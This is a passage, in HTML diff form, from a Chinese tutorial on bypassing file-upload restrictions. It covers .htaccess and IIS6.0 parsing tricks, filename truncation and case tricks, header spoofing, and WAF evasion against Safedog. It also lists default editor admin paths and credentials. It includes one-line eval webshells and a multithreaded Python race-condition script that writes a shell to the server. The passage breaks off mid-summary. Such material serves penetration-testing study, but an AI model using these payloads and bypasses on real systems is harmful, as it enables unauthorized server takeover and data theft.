+<span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string">"sorry"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span></code></pre>
+<p>默认上传后的文件保存的名字是已获取到的名字</p>
+<h5 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h5><h6 id="配合Apache的-htaccess文件上传解析漏洞"><a href="#配合Apache的-htaccess文件上传解析漏洞" class="headerlink" title="配合Apache的.htaccess文件上传解析漏洞"></a>配合Apache的.htaccess文件上传解析漏洞</h6><blockquote>
+<p>.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。</p>
+</blockquote>
+<p>有些服务器在上传认证时没有拦截.htaccess文件上传，就会造成恶意用户利用上传.htaccess文件解析漏洞，来绕过验证进行上传WEBShell，从而达到控制网站服务器的目的。</p>
+<p>首先我们编写一个.htaccess文件。打开记事本，编写代码“AddType application/x-httpd-php .jpg”，然后点击文件选中另存为，编写文件名为.htaccess，选择保存类型为所有文件。然后将其进行上传。因为.htaccess是apache服务器中的一个配置文件,不在上传的文件的黑名单之内,所以.htaccess文件是可以上传成功。</p>
+<p>接下来我们制造一个一句话木马文件，如取名为yijuhua.php。因为之前上传成功到服务器的.htaccess文件里的代码可以让 .jpg后缀名文件格式的文件名以php格式解析，因此达到了可执行的效果。所以我们把yijuhua.php文件的后缀名改为.jpg格式,让.htaccess文件解析yijuhua.jpg文件里的php代码，从而使木马上传成功并达到可执行的目的。</p>
+<h6 id="Apache站上的解析缺陷绕过上传漏洞"><a href="#Apache站上的解析缺陷绕过上传漏洞" class="headerlink" title="Apache站上的解析缺陷绕过上传漏洞"></a>Apache站上的解析缺陷绕过上传漏洞</h6><p>Apache的解析漏洞主要特性为Apache是从后面开始检查后缀，按最后一个合法后缀执行，整个漏洞的关键就是Apache的合法后缀到底是哪些，不是合法后缀的都可以被利用，所以将木马的后缀进行修改为允许上传的类型后，即可成功绕过验证，最终拿到权限。</p>
+<p>例如新建完要上传的一句话木马文件后命名为yijuhua.php，然后我们在文件后缀处添加上7z，就有可能绕过验证上传成功。也可以修改后缀名为cab、zip、bmp等，只要是允许的上传类型都可能被上传成功。最后通过菜刀类工具访问即可。</p>
+<h6 id="IIS6-0站上的目录路径检测解析绕过上传漏洞"><a href="#IIS6-0站上的目录路径检测解析绕过上传漏洞" class="headerlink" title="IIS6.0站上的目录路径检测解析绕过上传漏洞"></a>IIS6.0站上的目录路径检测解析绕过上传漏洞</h6><p>当我们使用的服务器都是Windows2003，并且使用的服务为IIS6.0时，就可能存在如本节所描述的漏洞。</p>
+<p>以asp为例，先准备好一句话木马文件，然后通过burpsuite进行抓包：</p>
+<p><img src="https://images.seebug.org/content/images/2018/04/6dd812e6-eb1e-417b-96bd-d5f2e28b9aff.png-w331s" alt="img"></p>
+<p>查看数据包：</p>
+<p>其中<code>Content-Disposition:form-data;name=”path”</code>下面的一行为服务保存文件的相对路径，我们把原本的 uploadimg/改为<code>uploadimg/1.asp/;</code>，<code>filename=&quot;yijuhua.asp&quot;</code>修改为<code>filename=&quot;yijuhua.asp/1.jpg&quot;</code>。如图：</p>
+<p><img src="https://images.seebug.org/content/images/2018/04/5b991dc4-d954-4d9c-8c9f-78c664b46bb2.png-w331s" alt="img"></p>
+<p>本例的知识点在于利用了IIS6.0目录路径检测解析，文件的名字为<code>“yijuhua.asp/1.jpg”</code>，也同样会被IIS当作ASP文件来解析并执行。</p>
+<p>首先我们请求<code>/yijuhua.asp/1.jpg</code>，服务器会从头部查找查找”.”号,获得.asp/1.jpg。然后查找”/“,如果有则内存截断，所以<code>/yijuhua.asp/1.jpg</code>会当做<code>/yijuhua.asp</code>进行解析。</p>
+<p>上传成功后，通过response我们可以查看到得到的文件名信息为“1.asp;14127900008.asp”，那么就可以在前面添加上uploadimg/，从而构造访问地址为：<code>“http://www.test.com/uploadimg/1.asp;14127900008.asp”</code>，并通过菜刀类的工具进行访问了。</p>
+<h6 id="IIS6-0站上的解析缺陷绕过上传漏洞"><a href="#IIS6-0站上的解析缺陷绕过上传漏洞" class="headerlink" title="IIS6.0站上的解析缺陷绕过上传漏洞"></a>IIS6.0站上的解析缺陷绕过上传漏洞</h6><p>此类方法与上面讲的目录解析有点类似，不同点在于是利用文件解析来达到绕过上传的目的。</p>
+<p>以php为例，同样是准备好一句话木马文件后通过burpsuite进行抓包。</p>
+<p>查看数据包：</p>
+<p>其中<code>Content-Disposition:form-data;name=”path”</code>下面的一行为服务保存文件的相对路径，我们把原本的 <code>uploadimg/</code> 改为 <code>uploadimg/1.php;</code> ，<code>filename=&quot;yijuhua.php&quot;</code>修改为<code>filename=&quot;yijuhua.jpg&quot;</code>。</p>
+<p><img src="https://images.seebug.org/content/images/2018/04/e1c080a6-7aea-4e60-b007-20541c72db62.png-w331s" alt="img"></p>
+<p>本例中的知识点在于利用了IIS6.0目录路径检测解析，文件的名字为<code>“1.php;yijuhua.jpg”</code>，也同样会被IIS当作PHP文件来解析并执行</p>
+<p>首先我们请求<code>/1.php;yijuhua.jpg</code>，然后服务器会从头部查找查找”.”号,获得<code>.php;yijuhua.jpg</code>。接着查找到”;”，有则内存截断，所以<code>/1.php;yijuhua.jpg</code>会当做/1.php进行解析。</p>
+<p>最后类似上一节那样，通过response我们可以查看到得到的文件名信息为<code>“1.php;14127900008.php”</code>，在前面添加上uploadimg/，从而构造访问地址为：<code>“http://www.test.com/uploadimg/1.php;14127900008.php”</code>，并通过菜刀类的工具进行访问。</p>
+<p>1.使用大小写绕过（针对对大小写不敏感的系统如windows），如：PhP</p>
+<p>2.使用黑名单外的脚本类型，如：php5,asa 和 cer等(IIS默认支持解析.asp,.cdx, .asa,.cer等)</p>
+<p>能被解析的文件扩展名列表：</p>
+<pre><code>   jsp jspx jspf
+   asp asa cer aspx</code></pre><p>3.配合操作系统文件命令规则</p>
+<p>（1）上传不符合windows文件命名规则的文件名</p>
+<pre><code>   　　test.asp.
+   　　test.asp(空格)
+   　　test.php:1.jpg
+   　　test.php:: $DATA</code></pre><p>会被windows系统自动去掉不符合规则符号后面的内容。</p>
+<p>（2）linux下后缀名大小写</p>
+<p>在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。</p>
+<p>(3)借助系统特性突破扩展名验证，如：test.php_(在windows下,下划线是空格，保存文件时下划线被吃掉剩下test.php)</p>
+<p>4.双扩展名之间使用00截断，绕过验证上传恶意代码</p>
+<p>0x00截断：基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候</p>
+<pre><code>   　　test.php(0x00).jpg
+   　　test.php%00.jpg
+   　　路径/upload/1.php(0x00)，文件名1.jpg，结合/upload/1.php(0x00)/1.jpg</code></pre><p>5.超长文件名截断上传(windows 258byte | linux 4096byte)</p>
+<h4 id="服务端检测文件内容"><a href="#服务端检测文件内容" class="headerlink" title="服务端检测文件内容"></a>服务端检测文件内容</h4><h5 id="配合文件包含漏洞"><a href="#配合文件包含漏洞" class="headerlink" title="配合文件包含漏洞"></a>配合文件包含漏洞</h5><p>前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。</p>
+<p>绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）</p>
+<p>（1）先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；</p>
+<p>（2）然后再上传一个.php的文件，内容为<?php Include(“上传的txt文件路径”);?></p>
+<p>此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法：</p>
+<pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#PHP    </span>
+<span class="token delimiter">&lt;?php</span> <span class="token keyword">Include</span><span class="token punctuation">(</span><span class="token string">"上传的txt文件路径"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> 
+<span class="token shell-comment comment">#ASP    </span>
+<span class="token markup"><span class="token comment" spellcheck="true">&lt;!--#include file="上传的txt文件路径" --></span></span>
+<span class="token shell-comment comment">#JSP    </span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">jsp:</span>inclde</span> <span class="token attr-name">page</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>上传的txt文件路径<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></span>
+<span class="token keyword">or</span>  
+<span class="token operator">&amp;</span>lt<span class="token punctuation">;</span><span class="token operator">%</span>@<span class="token keyword">include</span> file<span class="token operator">=</span><span class="token string">"上传的txt文件路径"</span><span class="token operator">%</span><span class="token operator">></span></code></pre>
+<p>详细参考：<a href="http://thief.one/2017/04/10/2/" target="_blank" rel="noopener">文件包含漏洞(绕过姿势)</a></p>
+<h5 id="利用PHP特性（使用数组绕过）"><a href="#利用PHP特性（使用数组绕过）" class="headerlink" title="利用PHP特性（使用数组绕过）"></a>利用PHP特性（使用数组绕过）</h5><p><img src="https://images.seebug.org/content/images/2018/04/1bb9ff63-9b8c-415e-bc9a-69f843b97ee5.png-w331s" alt="img"></p>
+<p>file_put_contents 这个函数的第二个参数 可以是数组</p>
+<p>然后 如果代码里用正则匹配 bad word 的时候</p>
+<p>对一个数组进行正则匹配没用</p>
+<h4 id="服务端检测文件头"><a href="#服务端检测文件头" class="headerlink" title="服务端检测文件头"></a>服务端检测文件头</h4><h5 id="文件头简介"><a href="#文件头简介" class="headerlink" title="文件头简介"></a>文件头简介</h5><p>不同的图片文件都有不同文件头，如：</p>
+<p>PNG： 文件头标识 (8 bytes) 89 50 4E 47 0D 0A 1A 0A</p>
+<p>JPEG： 文件头标识 (2 bytes): 0xff, 0xd8 (SOI) (JPEG 文件标识)</p>
+<p>GIF： 文件头标识 (6 bytes) 47 49 46 38 39(37) 61</p>
+<p>PHP使用getimagesize函数验证图片文件头</p>
+<h5 id="绕过方式-1"><a href="#绕过方式-1" class="headerlink" title="绕过方式"></a>绕过方式</h5><p>绕过这个检测只需要在恶意脚本前加上允许上传文件的头标识就可以了</p>
+<p>在木马内容基础上再加了一些文件信息，有点像下面的结构</p>
+<pre class=" language-php"><code class="language-php">GIF89a
+<span class="token delimiter">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre>
+<h4 id="上传到服务端后验证"><a href="#上传到服务端后验证" class="headerlink" title="上传到服务端后验证"></a>上传到服务端后验证</h4><h5 id="竞争上传"><a href="#竞争上传" class="headerlink" title="竞争上传"></a>竞争上传</h5><p>演示代码</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$allowtype</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"gif"</span><span class="token punctuation">,</span><span class="token string">"png"</span><span class="token punctuation">,</span><span class="token string">"jpg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$size</span> <span class="token operator">=</span> <span class="token number">10000000</span><span class="token punctuation">;</span>
+<span class="token variable">$path</span> <span class="token operator">=</span> <span class="token string">"./"</span><span class="token punctuation">;</span>
+
+<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$path</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error:can not move"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error:not an upload file！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token variable">$newfile</span> <span class="token operator">=</span> <span class="token variable">$path</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"file upload success.file path is: "</span><span class="token punctuation">.</span><span class="token variable">$newfile</span><span class="token punctuation">.</span><span class="token string">"\n&lt;br />"</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$newfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Upload file error: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token variable">$allowtype</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$newfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error:upload the file type is not allowed，delete the file！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span></code></pre>
+<p>首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，我们的利用思路是这样的，首先上传一个php文件，内容为：</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"./info.php"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'&lt;?php @eval($_POST["drops"]) ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre>
+<p>​    当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。利用代码如下：</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> os
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> threading
+
+<span class="token keyword">class</span> <span class="token class-name">RaceCondition</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:8080/upload/shell0.php"</span>
+        self<span class="token punctuation">.</span>uploadUrl <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:8080/upload/copy.php"</span>
+
+    <span class="token keyword">def</span> <span class="token function">_get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'try to call uploaded file...'</span><span class="token punctuation">)</span>
+        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]create file info.php success"</span><span class="token punctuation">)</span>
+            os<span class="token punctuation">.</span>_exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">def</span> <span class="token function">_upload</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"upload file....."</span><span class="token punctuation">)</span>
+        file <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"file"</span><span class="token punctuation">:</span>open<span class="token punctuation">(</span><span class="token string">"shell0.php"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
+        requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>self<span class="token punctuation">.</span>uploadUrl<span class="token punctuation">,</span> files<span class="token operator">=</span>file<span class="token punctuation">)</span>
+
+    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+            <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                self<span class="token punctuation">.</span>_get<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                self<span class="token punctuation">.</span>_upload<span class="token punctuation">(</span><span class="token punctuation">)</span>
+                self<span class="token punctuation">.</span>_get<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    threads <span class="token operator">=</span> <span class="token number">20</span>
+
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>threads<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        t <span class="token operator">=</span> RaceCondition<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>threads<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>经过几次尝试后成功成功写入shell</p>
+<p><img src="https://images.seebug.org/content/images/2018/04/e0906f72-9da9-403c-a942-ba3771a931e0.png-w331s" alt="img"></p>
+<h4 id="针对各种CMS"><a href="#针对各种CMS" class="headerlink" title="针对各种CMS"></a>针对各种CMS</h4><p>比如说JCMS等存在的漏洞，可以针对不同CMS存在的上传漏洞进行绕过。</p>
+<ul>
+<li>PHPCMSv9.6.0任意文件上传</li>
+</ul>
+<h5 id="针对各种编辑器漏洞"><a href="#针对各种编辑器漏洞" class="headerlink" title="针对各种编辑器漏洞"></a>针对各种编辑器漏洞</h5><p>比如FCK，ewebeditor等，可以针对编辑器的漏洞进行绕过。</p>
+<h5 id="文本编辑器"><a href="#文本编辑器" class="headerlink" title="文本编辑器"></a>文本编辑器</h5><p>常见的文本编辑器有CKEditor、eWebEditor、UEditor、KindEditor、xhEditor等，它们的功能类似且都有图片上传、视频上传、远程下载等功能，这类文本编辑器也称为富文本编辑器。</p>
+<h5 id="1-FCKeditor"><a href="#1-FCKeditor" class="headerlink" title="1 FCKeditor"></a>1 FCKeditor</h5><p>下面以FCKeditor(现名为CKEditor)为例：</p>
+<pre><code>1、敏感信息暴漏
+    * 查看版本信息
+        /FCKeditor/editor/dialog/fck_about.html
+    * 默认上传页面
+        /FCKeditor/editor/filemanager/browser/default/browser.html
+        /FCKeditor/editor/filemanager/browser/default/connectors/test.html
+        /FCKeditor/editor/filemanager/upload/test.html
+        /FCKeditor/editor/filemanager/connectors/test.html
+        /FCKeditor/editor/filemanager/connectors/uploadtest.html
+    * 其他敏感文件
+        /FCKeditor/editor/filemanager/connectors/aspx/connector.html
+        /FCKeditor/editor/filemanager/connectors/asp/connector.html
+        /FCKeditor/editor/filemanager/connectors/php/connector.php
+2、黑名单策略错误
+    FCKeditor&lt;=2.4.3版本采用的是有弊端的黑名单策略，可以采用asa、cer等扩展名
+3、任意文件上传漏洞
+    FCKeditor的2.4.2及以下本本的黑名单配置信息里没有定义类型Media，直接构造html表单就行，
+在form中的action=&quot;http://22.22.22.22/fckeditor/editor/filemanager/upload/php/upload.php?Type=Media&quot; 即可，然后上传</code></pre><h5 id="2-eWebEditor"><a href="#2-eWebEditor" class="headerlink" title="2 eWebEditor"></a>2 eWebEditor</h5><pre><code>1、默认后台
+    2.80以前为：ewebeditor/admin_login.asp
+    2.80以后为：admin/login.asp
+2、默认账号密码
+    admin   admin888
+3、数据库地址
+    默认数据库地址
+    ewebeditor/db/ewebeditor.mdb
+    常用数据库地址
+    ewebeditor/db/ewebeditor.asa
+    ewebeditor/db/ewebeditor.asa
+    ewebeditor/db/#ewebeditor.asa
+    ewebeditor/db/#ewebeditor.mdb
+    ewebeditor/db/!@#ewebeditor.asp
+    ewebeditor/db/ewebeditor1033.mdb
+    asp asa为后缀的数据库下载下来后改为mdb</code></pre><h4 id="针对各种WAF"><a href="#针对各种WAF" class="headerlink" title="针对各种WAF"></a>针对各种WAF</h4><h5 id="1-垃圾数据"><a href="#1-垃圾数据" class="headerlink" title="1 垃圾数据"></a>1 垃圾数据</h5><p>有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验；</p>
+<p><img src="https://images.seebug.org/content/images/2018/04/a7ae783e-9275-4e41-9c70-c899396fb012.png-w331s" alt="img"></p>
+<p>当然也可以将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验。</p>
+<p><img src="https://images.seebug.org/content/images/2018/04/cd2f1355-be07-4c63-a802-0aa991bf2197.png-w331s" alt="img"></p>
+<p>可以将垃圾数据加上Content-Disposition参数后面，参数内容过长，可能会导致waf检测出错。</p>
+<h5 id="2-filename"><a href="#2-filename" class="headerlink" title="2 filename"></a>2 filename</h5><p>针对早期版本安全狗，可以多加一个filename</p>
+<p><img src="https://images.seebug.org/content/images/2018/04/0bd2ce6f-25e0-4f59-b004-957ff71b1fd9.png-w331s" alt="img"></p>
+<p>或者将filename换位置，在IIS6.0下如果我们换一种书写方式，把filename放在其他地方：</p>
+<p><img src="https://images.seebug.org/content/images/2018/04/d86eaa81-9a84-40dc-9347-6c5bfdbfeaf6.png-w331s" alt="img"></p>
+<h5 id="3-POST-GET"><a href="#3-POST-GET" class="headerlink" title="3 POST/GET"></a>3 POST/GET</h5><p>有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。 此种情况可以上传一个POST型的数据包，抓包将POST改为GET。</p>
+<h5 id="4-以上方式"><a href="#4-以上方式" class="headerlink" title="4 以上方式"></a>4 以上方式</h5><p>针对WAF，以上介绍的服务器解析漏洞、文件包含漏洞等都可以尝试绕过。</p>
+<p>**</p>
+<h5 id="5-利用waf本身缺陷"><a href="#5-利用waf本身缺陷" class="headerlink" title="5 利用waf本身缺陷"></a>5 利用waf本身缺陷</h5><h6 id="删除实体里面的Conten-Type字段"><a href="#删除实体里面的Conten-Type字段" class="headerlink" title="删除实体里面的Conten-Type字段"></a>删除实体里面的Conten-Type字段</h6><p><img src="https://images.seebug.org/content/images/2018/04/f7b360e4-e055-43b7-ae94-b98419256476.png-w331s" alt="img"></p>
+<p>第一种是删除Content整行，第二种是删除C后面的字符。删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php。</p>
+<pre class=" language-html"><code class="language-html">正常包：Content-Disposition: form-data; name="image"; filename="085733uykwusqcs8vw8wky.png"Content-Type: image/png
+构造包：Content-Disposition: form-data; name="image"; filename="085733uykwusqcs8vw8wky.png
+C.php"</code></pre>
+<h6 id="删除Content-Disposition字段里的空格"><a href="#删除Content-Disposition字段里的空格" class="headerlink" title="删除Content-Disposition字段里的空格"></a>删除Content-Disposition字段里的空格</h6><p><img src="https://images.seebug.org/content/images/2018/04/1ca10020-3739-4def-b0e1-f4b004a1f196.png-w331s" alt="img"></p>
+<p>增加一个空格导致安全狗被绕过案列： Content-Type: multipart/form-data; boundary=—————————4714631421141173021852555099 尝试在boundary后面加个空格或者其他可被正常处理的字符： boundary= —————————47146314211411730218525550</p>
+<h6 id="修改Content-Disposition字段值的大小写"><a href="#修改Content-Disposition字段值的大小写" class="headerlink" title="修改Content-Disposition字段值的大小写"></a>修改Content-Disposition字段值的大小写</h6><p><img src="https://images.seebug.org/content/images/2018/04/ae0437ec-b9f5-48db-a28f-75408445c23f.png-w331s" alt="img"></p>
+<h6 id="Boundary边界不一致"><a href="#Boundary边界不一致" class="headerlink" title="Boundary边界不一致"></a>Boundary边界不一致</h6><p>每次文件上传时的Boundary边界都是一致的：</p>
+<pre><code>Content-Type: multipart/form-data; boundary=---------------------------4714631421141173021852555099
+Content-Length: 253
+-----------------------------4714631421141173021852555099
+Content-Disposition: form-data; name=&quot;file1&quot;; filename=&quot;shell.asp&quot;
+Content-Type: application/octet-stream
+
+&lt;%eval request(&quot;a&quot;)%&gt;
+-----------------------------4714631421141173021852555099--</code></pre><p>但如果容器在处理的过程中并没有严格要求一致的话可能会导致一个问题，两段Boundary不一致使得waf认为这段数据是无意义的，可是容器并没有那么严谨： Win2k3 + IIS6.0 + ASP</p>
+<p><img src="https://images.seebug.org/content/images/2018/04/c4f02267-e336-41c1-9423-3c86fa81856b.png-w331s" alt="img"></p>
+<h6 id="文件名处回车"><a href="#文件名处回车" class="headerlink" title="文件名处回车"></a>文件名处回车</h6><p><img src="https://images.seebug.org/content/images/2018/04/80c9d74a-d9bc-411c-af2a-a704eb5e1aff.png-w331s" alt="img"></p>
+<h6 id="多个Content-Disposition"><a href="#多个Content-Disposition" class="headerlink" title="多个Content-Disposition"></a>多个Content-Disposition</h6><p>在IIS的环境下，上传文件时如果存在多个Content-Disposition的话，IIS会取第一个Content-Disposition中的值作为接收参数，而如果waf只是取最后一个的话便会被绕过，Win2k8 + IIS7.0 + PHP</p>
+<p><img src="https://images.seebug.org/content/images/2018/04/6b945737-c4b4-4350-a5ba-972b35b09fda.png-w331s" alt="img"></p>
+<h5 id="利用NTFS-ADS特性"><a href="#利用NTFS-ADS特性" class="headerlink" title="利用NTFS ADS特性"></a>利用NTFS ADS特性</h5><p>ADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。在上传文件时，如果waf对请求正文的filename匹配不当的话可能会导致绕过。</p>
+<p><img src="https://images.seebug.org/content/images/2018/04/b3625731-9f1d-4889-8609-b357b61a2368.png-w331s" alt="img"></p>
+<h5 id="文件重命名绕过"><a href="#文件重命名绕过" class="headerlink" title="文件重命名绕过"></a>文件重命名绕过</h5><p>如果web程序会将filename除了扩展名的那段重命名的话，那么还可以构造更多的点、符号等等。</p>
+<p><img src="https://images.seebug.org/content/images/2018/04/95eabfd7-54b0-4f0f-971f-2316423fac33.png-w331s" alt="img"></p>
+<h5 id="特殊的长文件名绕过"><a href="#特殊的长文件名绕过" class="headerlink" title="特殊的长文件名绕过"></a>特殊的长文件名绕过</h5><p>文件名使用非字母数字，比如中文等最大程度的拉长，不行的话再结合一下其他的特性进行测试：</p>
+<p>shell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg</p>
+<h5 id="反删除"><a href="#反删除" class="headerlink" title="反删除"></a>反删除</h5><p>将下图file1改成了file4，这样就不会把这个文件删除了。（JCMS漏洞）</p>
+<p><img src="https://images.seebug.org/content/images/2018/04/389b0352-5ba1-4d7c-8d77-198dab060856.png-w331s" alt="img"></p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><pre class=" language-html"><code class="language-html">条件： 寻找一个上传点，查看上传点是否可用。
+
+利用：
+
+首先判断是程序员自己写的上传点，还是编辑器的上传功能
+
+如果是编辑器上传功能，goolge当前编辑器的漏洞
+
+如果是程序员写的上传点
+
